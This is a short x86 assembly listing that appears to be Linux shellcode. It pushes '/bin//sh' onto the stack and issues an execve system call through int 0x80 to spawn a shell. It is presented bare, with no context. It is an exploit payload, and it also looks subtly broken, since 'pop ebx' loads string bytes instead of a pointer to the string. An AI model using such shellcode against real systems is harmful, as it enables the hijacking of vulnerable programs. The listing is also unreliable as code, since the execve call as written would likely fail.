global _start
	_start:
		xor eax, eax
		cdq
		xor ecx, ecx
		push eax
		push "//sh"
		push "/bin"
		pop ebx
		mov al, 0bH
		int 80H
		
